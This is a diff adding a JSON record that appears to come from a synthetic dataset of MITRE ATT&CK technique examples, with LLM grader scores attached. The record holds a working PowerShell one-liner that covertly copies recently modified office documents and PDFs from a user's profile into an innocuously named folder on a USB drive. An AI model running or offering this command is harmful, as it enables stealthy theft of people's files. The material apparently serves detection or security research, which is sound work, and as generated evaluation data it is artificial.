@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1052",
+  "platform": "Windows",
+  "shell": "Powershell",
+  "command": "$usb=((Get-CimInstance Win32_LogicalDisk -Filter \"DriveType=2\" | Select -First 1 -ExpandProperty DeviceID)+'\\'); $dst=Join-Path $usb (\"{0}_backup\" -f $env:COMPUTERNAME); New-Item -ItemType Directory -Force -Path $dst | Out-Null; Get-ChildItem -Path $env:USERPROFILE -Include *.docx,*.xlsx,*.pptx,*.pdf -File -Recurse -ErrorAction SilentlyContinue | Where-Object { $_.LastWriteTime -gt (Get-Date).AddDays(-3) } | Copy-Item -Destination $dst -Force",
+  "explanation": "Selectively copies recently modified office documents to a benign-looking backup folder on the USB using Copy-Item, minimizing volume and attention.",
+  "rationale_steps": [
+    "Resolve removable drive letter",
+    "Create an innocuous destination folder",
+    "Filter for recent sensitive document types",
+    "Copy results to USB via Copy-Item"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1052-1ea95c55-a10d6722",
+  "source_prompt_hash": "1ea95c55",
+  "timestamp_utc": "2025-09-30T05:10:56.829613Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell one-liner is well-formed with balanced quotes and parentheses, proper separators, and valid cmdlet and parameter usage.",
+        "semantic_score": 4,
+        "semantic_justification": "It plausibly exfiltrates recent office documents to a removable USB drive, though -Include may not filter without a wildcard in the Path, which can reduce selectivity.",
+        "combined_score": 4.5,
+        "confidence": 0.9,
+        "timestamp": "2025-10-01T09:46:37.296965Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced parentheses, proper string formatting using -f operator, valid cmdlet flags, and correct pipeline chaining throughout.",
+        "semantic_score": 5,
+        "semantic_justification": "The command precisely implements T1052 by detecting a removable USB drive (DriveType=2), creating a benign-named backup directory, and selectively copying recently modified Office documents (docx, xlsx, pptx, pdf) from the user profile within the last 3 days, fully aligning with the technique's data staging and physical medium exfiltration behaviors.",
+        "combined_score": 5.0,
+        "confidence": 0.97,
+        "timestamp": "2026-02-18T22:40:46.995612Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The command uses valid PowerShell syntax, correctly handles variables, utilizes standard cmdlets, and maintains proper pipeline flow.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements Exfiltration Over Physical Medium by identifying a removable drive and selectively copying specific documents based on file type and recent modification time.",
+        "combined_score": 5.0,
+        "confidence": 1.0,
+        "timestamp": "2026-02-18T22:40:50.170243Z"
+      }
+    ],
+    "llm_average_syntactic": 5.0,
+    "llm_average_semantic": 4.667,
+    "llm_average_score": 4.833,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
